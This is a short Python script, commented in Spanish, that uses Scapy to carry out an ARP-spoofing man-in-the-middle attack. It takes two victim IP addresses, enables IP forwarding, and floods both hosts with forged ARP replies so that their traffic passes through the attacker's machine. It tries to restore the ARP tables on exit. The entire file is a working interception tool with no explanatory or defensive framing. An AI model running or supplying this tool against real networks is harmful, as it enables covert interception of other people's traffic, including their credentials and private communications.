#!/usr/bin/env python3
"""
ARP Man-in-the-Middle - Envía respuestas ARP falsas continuamente.
Parámetros: -t1 <IP victima1> -t2 <IP victima2> -i <interfaz>
"""
import sys
import time
import argparse
from scapy.all import *

def enable_ip_forward():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')
    print("[*] IP forwarding activado.")

def get_mac(ip, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def poison(target_ip, spoof_ip, iface, my_mac):
    pkt = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=my_mac)
    sendp(pkt, iface=iface, verbose=False)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t1', required=True, help='IP victima 1')
    parser.add_argument('-t2', required=True, help='IP victima 2')
    parser.add_argument('-i', '--iface', required=True, help='Interfaz de red')
    args = parser.parse_args()

    my_mac = get_if_hwaddr(args.iface)
    enable_ip_forward()

    print(f"[*] Envenenando: {args.t1} <-> {args.t2}")
    try:
        while True:
            poison(args.t1, args.t2, args.iface, my_mac)
            poison(args.t2, args.t1, args.iface, my_mac)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Restaurando tablas ARP...")
        # Restauración: enviar paquetes ARP correctos (requiere MACs reales)
        mac1 = get_mac(args.t1, args.iface)
        mac2 = get_mac(args.t2, args.iface)
        if mac1 and mac2:
            sendp(Ether(src=mac2)/ARP(op=2, pdst=args.t1, psrc=args.t2, hwsrc=mac2), iface=args.iface, verbose=False)
            sendp(Ether(src=mac1)/ARP(op=2, pdst=args.t2, psrc=args.t1, hwsrc=mac1), iface=args.iface, verbose=False)
        sys.exit(0)

if __name__ == '__main__':
    main()
